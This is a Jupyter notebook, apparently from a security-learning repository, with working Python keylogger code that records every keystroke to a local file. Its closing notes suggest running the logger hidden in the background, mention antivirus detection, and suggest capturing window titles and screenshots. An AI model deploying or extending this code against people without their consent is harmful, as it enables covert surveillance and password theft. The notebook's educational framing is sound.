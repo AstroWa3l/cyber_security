{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- A Keylogger project is a great way to understand how input events work, but it’s crucial to remember that keyloggers should be used responsibly and ethically, ideally in a controlled environment for learning purposes only.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Need to get pynput module if not already installed\n",
    "#!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's now create the Key Press Listener\n",
    "import time\n",
    "\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "# Save the key presses in a file\n",
    "log_file = \"key_log.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    with open(log_file, 'a') as log:\n",
    "        log.write(f\"{time.ctime()} - \")\n",
    "        try:\n",
    "            log.write(f\"{key.char}\")\n",
    "        except AttributeError:\n",
    "            log.write(f\"  [{key}] \") # If the key is not a character, then write it in square brackets\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "    \n",
    "# Start the listener\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "What else can we do to improve this script? \n",
    "\n",
    "- Make It Run in the Background (Optional)\n",
    "To make it a background process, you can convert the script to run invisibly, but be cautious as it may be flagged by antivirus software. On Linux, you could run it in the background with nohup python keylogger.py &.\n",
    "\n",
    "- Add Security Measures Since logging keystrokes can be sensitive, consider adding features to:\n",
    "    - Encrypt the log file to protect the data.\n",
    "    - Limit logging to a specific period or application.\n",
    "\n",
    "- Analyze and Improve\n",
    "This basic keylogger can help you learn how keystrokes are captured. To expand, you could:\n",
    "    - Track specific keys or applications.\n",
    "    - Log more metadata, such as active window or screen capture.\n",
    "\n",
    "This project will give you insight into input monitoring and how malicious software might misuse such techniques. Let me know if you'd like help with any specific features or expansions for this project!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
